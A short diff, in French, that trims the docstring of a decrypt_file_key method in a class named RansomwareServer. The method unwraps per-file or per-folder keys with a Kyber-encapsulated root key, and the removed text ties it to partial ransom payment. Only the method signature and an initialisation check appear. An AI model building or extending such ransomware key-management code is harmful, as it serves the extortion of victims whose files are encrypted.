@@ -135,15 +135,14 @@ class RansomwareServer:
 
     def decrypt_file_key(self, root_key_data: Dict, kyber_ciphertext: bytes) -> bytes:
         """
-        Déchiffre une file_key ou folder_key encapsulée avec la root_key.
-        Utilisé pour le déchiffrement individuel d'un fichier/dossier (paiement partiel).
+        Déchiffre file_key ou folder_key encapsulée avec root_key.
 
         Args:
-            root_key_data: Contenu du fichier .root_key {ciphertext, nonce} (base64)
-            kyber_ciphertext: Ciphertext Kyber pour reconstruire la root_key
+            root_key_data: Contenu fichier .root_key {ciphertext, nonce} 
+            kyber_ciphertext: Ciphertext Kyber pour root_key
 
         Returns:
-            Clé déchiffrée (file_key ou folder_key)
+            Clé déchiffrée
         """
         if not self.initialized or self.kyber_secret_key is None:
             raise RuntimeError("[ERR] Le serveur n'est pas initialisé")
